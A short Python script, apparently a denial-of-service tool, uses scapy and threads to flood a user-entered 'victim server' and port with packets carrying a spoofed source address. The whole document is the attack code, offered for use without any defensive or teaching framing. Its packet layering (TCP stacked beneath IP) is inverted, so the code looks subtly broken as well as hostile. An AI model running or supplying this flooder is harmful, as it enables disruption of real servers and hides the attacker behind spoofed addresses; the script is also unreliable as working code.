import scapy.all as scapy
import threading
host=str(input('Enter victim server:'))
port=int(input("Enter attack port:"))
thrds=int(input("Enter number of threads:"))
tcp=scapy.TCP()
ip=scapy.IP()
raw=scapy.Raw()
fnlPack=tcp/ip/raw
fnlPack.dst=host
fnlPack.src='69.69.69.69'
fnlPack.dport=port
fnlPack.load='flooder packet'
#print (fnlPack.show())
def flooder():
    try:
        while(True):
            scapy.send(fnlPack,verbose=False)
            print("Sending packets to", host, "press [ctrl+c] to interrupt")
    except KeyboardInterrupt:
                print('Stopped flooding')


for i in range(1,thrds):
    t=threading.Thread(target=flooder)
    t.start()

